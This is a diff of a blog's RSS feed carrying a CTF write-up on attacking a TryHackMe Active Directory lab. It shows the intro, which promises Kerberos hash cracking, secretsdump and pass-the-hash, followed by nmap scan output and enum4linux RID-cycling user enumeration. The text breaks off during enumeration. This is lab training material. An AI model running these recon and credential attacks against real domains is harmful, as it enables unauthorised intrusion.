@@ -1,4 +1,622 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Wed, 15 Apr 2020 16:48:17 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>thecodcaper CTF | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope&lt;/p&gt;</description><link>http://localhost:2368/thecodca/</link><guid isPermaLink="false">5e90424a5e61514e230adc77</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 14 Apr 2020 18:52:00 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/pgn.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/pgn.png" alt="thecodcaper CTF | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is so impressive, not rated yet but from my little experience I can tell there's no easy or hard challenge, it's all about how out-of-the-box can you think. but no worries this one does have hints and the techniques are provided with the questioner. anyways! hope you guys enjoy this write-up, Let's enumerate machine!&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/jVZmRHItLSlGE1SYBV" width="480" height="273" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/cbs-306-seal306-seal-team-jVZmRHItLSlGE1SYBV"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.201.143
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.13</generator><lastBuildDate>Fri, 17 Apr 2020 15:09:04 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Attacktive Directory | THM write-up</title><description>&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge&lt;/p&gt;</description><link>http://localhost:2368/attacktive-directory-thm-write-up/</link><guid isPermaLink="false">5e998781da86f68ecc6f04ae</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 17 Apr 2020 14:53:35 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/aD.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/aD.png" alt="Attacktive Directory | THM write-up"&gt;&lt;p&gt;Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called &lt;strong&gt;Sp00ky&lt;/strong&gt;.&lt;br&gt;in my opinion, anyone who wants to get close to active directory exploitation this is the one for you, the amount of knowledge you'll learn is just amazing, because Active directories use different protocols. You'll learn a lot about Kerberos and how to crack their hashes, and how to use Impacket Secretsdump to dump Domain-Control hashes, and how to access the machine with only NTLM hash with Evil-WinRM ...&lt;/p&gt;&lt;blockquote&gt;Enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -p- -A -nP 10.10.203.152
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 10:37 UTC
+Nmap scan report for 10.10.203.152
+Host is up (0.00043s latency).
+Not shown: 65508 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 10:43:23Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2020-04-17T10:45:49+00:00
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2020-04-03T18:40:09
+|_Not valid after:  2020-10-03T18:40:09
+|_ssl-date: 2020-04-17T10:46:02+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49690/tcp open  msrpc         Microsoft Windows RPC
+49789/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=4/17%Time=5E99884F%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+MAC Address: 02:41:2E:CE:EA:1A (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=4/17%OT=53%CT=1%CU=44531%PV=Y%DS=1%DC=D%G=Y%M=02412E%T
+OS:M=5E998918%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%TI=I%CI=I%II=I
+OS:%SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%
+OS:O5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
+OS:6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S
+OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y
+OS:%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%
+OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=8
+OS:0%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%
+OS:Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
+OS:Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_nbstat: NetBIOS name: ATTACKTIVEDIREC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:41:2e:ce:ea:1a (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-17T10:45:49
+|_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.43 ms 10.10.203.152
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 550.50 seconds
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;running nmap will help us gather a lot of information about the Active directory and our target in general. for the next step, we will take the DNS domain name and add it to &lt;strong&gt;/etc/hosts&lt;/strong&gt; since we are practising in a local area network&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-17-at-11.07.30.png" class="kg-image" alt="Attacktive Directory | THM write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# echo 10.10.237.175 spookysec.local &amp;gt;&amp;gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The next step, enumerating the two ports used by AD &lt;strong&gt;139&lt;/strong&gt; and &lt;strong&gt;445 &lt;/strong&gt;with enum4linux the flag -a stands for all simple enumeration, It will gather information for us including (userlist, machine list(s), sharelist, password policy information, group and member list, ...)&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# enum4linux -a spookysec.local
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Apr 17 13:15:56 2020
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... spookysec.local
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ======================================================= 
+|    Enumerating Workgroup/Domain on spookysec.local    |
+ ======================================================= 
+[+] Got domain/workgroup name: THM-AD
+
+ =============================================== 
+|    Nbtstat Information for spookysec.local    |
+ =============================================== 
+Looking up status of 10.10.237.175
+        ATTACKTIVEDIREC &amp;lt;00&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Workstation Service
+        THM-AD          &amp;lt;00&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain/Workgroup Name
+        THM-AD          &amp;lt;1c&amp;gt; - &amp;lt;GROUP&amp;gt; B &amp;lt;ACTIVE&amp;gt;  Domain Controllers
+        THM-AD          &amp;lt;1b&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  Domain Master Browser
+        ATTACKTIVEDIREC &amp;lt;20&amp;gt; -         B &amp;lt;ACTIVE&amp;gt;  File Server Service
+
+        MAC Address = 02-4D-80-A3-99-4E
+
+ ======================================== 
+|    Session Check on spookysec.local    |
+ ======================================== 
+[+] Server spookysec.local allows sessions using username '', password ''
+
+ ============================================== 
+|    Getting domain SID for spookysec.local    |
+ ============================================== 
+Domain Name: THM-AD
+Domain Sid: S-1-5-21-3591857110-2884097990-301047963
+[+] Host is part of a domain (not a workgroup)
+
+ ========================================= 
+|    OS information on spookysec.local    |
+ ========================================= 
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for spookysec.local from smbclient: 
+[+] Got OS info for spookysec.local from srvinfo:
+Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+
+ ================================ 
+|    Users on spookysec.local    |
+ ================================ 
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ============================================ 
+|    Share Enumeration on spookysec.local    |
+ ============================================ 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on spookysec.local
+
+ ======================================================= 
+|    Password Policy Information for spookysec.local    |
+ ======================================================= 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to spookysec.local using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+        [!] Protocol failed: Cannot request session (Called Name:SPOOKYSEC.LOCAL)
+
+[+] Trying protocol 445/SMB...
+
+        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+
+
+[E] Failed to get password policy with rpcclient
+
+
+ ================================= 
+|    Groups on spookysec.local    |
+ ================================= 
+
+[+] Getting builtin groups:
+
+[+] Getting builtin group memberships:
+
+[+] Getting local groups:
+
+[+] Getting local group memberships:
+
+[+] Getting domain groups:
+
+[+] Getting domain group memberships:
+
+ ========================================================================== 
+|    Users on spookysec.local via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================== 
+[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
+[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
+[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
+S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
+S-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)
+S-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1020 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1021 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1022 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1023 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1024 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1025 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1026 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1027 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1028 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1029 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1030 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1031 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1032 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1033 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1034 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1035 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1036 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1037 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1038 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1039 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1040 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1041 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1042 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1043 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1044 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1045 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1046 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1047 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1048 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1049 *unknown*\*unknown* (8)
+S-1-5-21-3532885019-1334016158-1514108833-1050 *unknown*\*unknown* (8)
+[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
+S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
+S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
+S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
+S-1-5-21-3591857110-2884097990-301047963-503 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-504 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-505 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-506 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-507 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-508 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-509 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-510 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-511 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
+S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-523 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-524 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
+S-1-5-21-3591857110-2884097990-301047963-528 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-529 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-530 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-531 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-532 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-533 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-534 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-535 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-536 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-537 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-538 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-539 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-540 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-541 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-542 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-543 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-544 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-545 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-546 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-547 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-548 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-549 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-550 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)
+S-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\*unknown* (8)
+S-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\*unknown* (8)
